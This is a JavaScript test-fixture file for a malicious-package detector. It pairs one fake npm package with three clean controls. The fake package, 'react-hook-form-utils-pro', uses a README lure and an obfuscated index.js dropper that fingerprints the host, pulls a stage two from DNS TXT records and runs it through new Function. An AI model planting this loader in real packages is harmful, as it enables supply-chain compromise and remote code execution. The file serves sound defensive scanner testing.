/**
 * "AI Slop" / WEL1DROPPER campaign — 800-package flood, Aug 2026.
 *
 * Entry point is NOT a lifecycle hook. The README instructs the victim to call
 * require()/import explicitly, so hook-only scanners see a clean package.json.
 * Once loaded, the module-load body runs a multi-stage downloader:
 *   1. hex string array + index decoder to hide all literals
 *   2. process.platform / process.arch fingerprint
 *   3. DNS TXT lookup for out-of-band stage-2 resolution
 *   4. base64 reassembly of the TXT records -> dynamic execution
 */
export const wel1dropper = {
  pkgJson: {
    name: 'react-hook-form-utils-pro',
    version: '1.0.4',
    description: 'Utility helpers for react-hook-form',
    main: 'index.js',
    // no scripts block at all — the whole point of the campaign
  },
  allFiles: [
    {
      path: 'README.md',
      content: [
        '# react-hook-form-utils-pro',
        '',
        'Zero-config helpers for react-hook-form.',
        '',
        '## Setup',
        '',
        '**Important:** you must initialize the module before use, otherwise the',
        'validators will not register:',
        '',
        '```js',
        "require('react-hook-form-utils-pro');",
        '```',
        '',
        'Or with ESM:',
        '',
        '```js',
        "import 'react-hook-form-utils-pro';",
        '```',
      ].join('\n'),
    },
    {
      path: 'index.js',
      content: [
        "const dns = require('dns');",
        '',
        'const _0x3a1f = [',
        "  '77656c312d726573'," /* wel1-res */,
        "  '6f6c7665722e6f72'," /* olver.or */,
        "  '672e78797a'," /* g.xyz */,
        "  '5f5f696e69745f5f'," /* __init__ */,
        "  '73746167653262'," /* stage2b */,
        "  '7061796c6f6164'," /* payload */,
        "  '5f5f6465636f6465'," /* __decode */,
        "  '77656c31',",
        "  '64726f70706572',",
        "  '5f5f7374616765',",
        '];',
        '',
        'function _0xd2(i) {',
        "  return Buffer.from(_0x3a1f[i], 'hex').toString('utf8');",
        '}',
        '',
        'const _fp = { p: process.platform, a: process.arch };',
        '',
        'const _seed =',
        "  'aGV4OjhmM2QyYTFjOTBiN2U0NTZkODJhMWYwYzc3M2U5YjRhNTZkMGYyODFjM2E5ZTdiNDIx';",
        '',
        'function _0x9c() {',
        "  const host = _0xd2(0) + _0xd2(1) + _0xd2(2);",
        '  dns.resolveTxt(_fp.p + "-" + _fp.a + "." + host, function (err, records) {',
        '    if (err || !records) return;',
        "    const blob = records.map(function (r) { return r.join(''); }).join('');",
        "    const code = Buffer.from(blob + _seed, 'base64').toString('utf8');",
        "    new Function('platform', 'arch', code)(_fp.p, _fp.a);",
        '  });',
        '}',
        '',
        '_0x9c();',
        '',
        'module.exports = { validate: function (v) { return !!v; } };',
      ].join('\n'),
    },
  ],
  expectedFindings: [
    { detector: 'tier1-ai-slop-dropper', id: 'D28-AI-SLOP-DROPPER' },
  ],
};

/**
 * FP control: a legitimate DNS/mail utility. Uses dns.resolveTxt for its actual
 * documented purpose (SPF lookup) with no obfuscation and no fingerprinting.
 */
export const cleanDnsUtility = {
  pkgJson: {
    name: 'spf-record-check',
    version: '2.1.0',
    description: 'Look up and parse SPF records over DNS',
    main: 'index.js',
    keywords: ['dns', 'spf', 'email'],
  },
  allFiles: [
    {
      path: 'index.js',
      content: [
        "const dns = require('dns').promises;",
        '',
        'async function lookupSpf(domain) {',
        '  const records = await dns.resolveTxt(domain);',
        "  return records.map((r) => r.join('')).filter((r) => r.startsWith('v=spf1'));",
        '}',
        '',
        'module.exports = { lookupSpf };',
      ].join('\n'),
    },
  ],
  expectedFindings: [],
};

/**
 * FP control: an ordinary package whose README shows the usual `require()`
 * example. The README lure signal must never fire on its own.
 */
export const cleanReadmeExample = {
  pkgJson: {
    name: 'slugify-lite',
    version: '1.3.2',
    description: 'Tiny string slugifier',
    main: 'index.js',
  },
  allFiles: [
    {
      path: 'README.md',
      content: [
        '# slugify-lite',
        '',
        '## Usage',
        '',
        '```js',
        "const slugify = require('slugify-lite');",
        "slugify('Hello World'); // 'hello-world'",
        '```',
      ].join('\n'),
    },
    {
      path: 'index.js',
      content: [
        'module.exports = function slugify(input) {',
        "  return String(input).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');",
        '};',
      ].join('\n'),
    },
  ],
  expectedFindings: [],
};

/**
 * FP control: a build tool that legitimately reads process.platform/arch to
 * pick a prebuilt binary URL. Fingerprint + network, but no obfuscation and no
 * out-of-band DNS resolution — must stay below the block threshold.
 */
export const cleanPrebuildInstaller = {
  pkgJson: {
    name: 'prebuild-fetch-lite',
    version: '4.0.1',
    description: 'Download prebuilt native binaries for the current platform',
    main: 'index.js',
  },
  allFiles: [
    {
      path: 'index.js',
      content: [
        "const https = require('https');",
        '',
        'function binaryUrl(version) {',
        '  const platform = process.platform;',
        '  const arch = process.arch;',
        '  return `https://github.com/acme/native/releases/download/v${version}/acme-${platform}-${arch}.tar.gz`;',
        '}',
        '',
        'function download(version, cb) {',
        '  https.get(binaryUrl(version), cb);',
        '}',
        '',
        'module.exports = { binaryUrl, download };',
      ].join('\n'),
    },
  ],
  expectedFindings: [],
};
